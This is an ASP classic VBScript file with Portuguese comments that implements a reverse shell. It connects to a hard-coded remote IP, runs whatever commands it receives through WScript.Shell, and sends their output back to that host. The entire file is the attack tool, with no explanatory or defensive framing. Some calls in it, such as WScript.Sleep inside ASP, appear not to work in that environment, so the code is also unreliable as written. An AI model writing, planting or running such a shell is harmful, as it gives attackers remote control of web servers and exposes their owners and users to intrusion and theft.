<%@ Language=VBScript %>
<%
' Configurações
Dim remoteHost
Dim remotePort

remoteHost = "172.20.1.47" ' Endereço IP do servidor remoto
remotePort = 80 ' Porta do servidor remoto

' Função para criar o reverse shell
Function CreateReverseShell(host, port)
    Dim oSocket, oShell, command, output, buffer
    Set oSocket = CreateObject("MSWinsock.Winsock")
    oSocket.RemoteHost = host
    oSocket.RemotePort = port
    oSocket.Connect

    ' Aguarda a conexão
    Do Until oSocket.Connected
        WScript.Sleep 100
    Loop

    Set oShell = CreateObject("WScript.Shell")

    Do
        command = ""
        ' Lê o comando enviado pelo servidor
        Do Until InStr(command, vbCrLf)
            buffer = oSocket.GetData
            If buffer <> "" Then
                command = command & buffer
            End If
        Loop

        ' Executa o comando
        output = oShell.Exec(command).StdOut.ReadAll

        ' Envia a saída do comando de volta ao servidor
        oSocket.SendData output & vbCrLf
    Loop

    oSocket.Close
End Function

' Chama a função de reverse shell
CreateReverseShell remoteHost, remotePort
%>

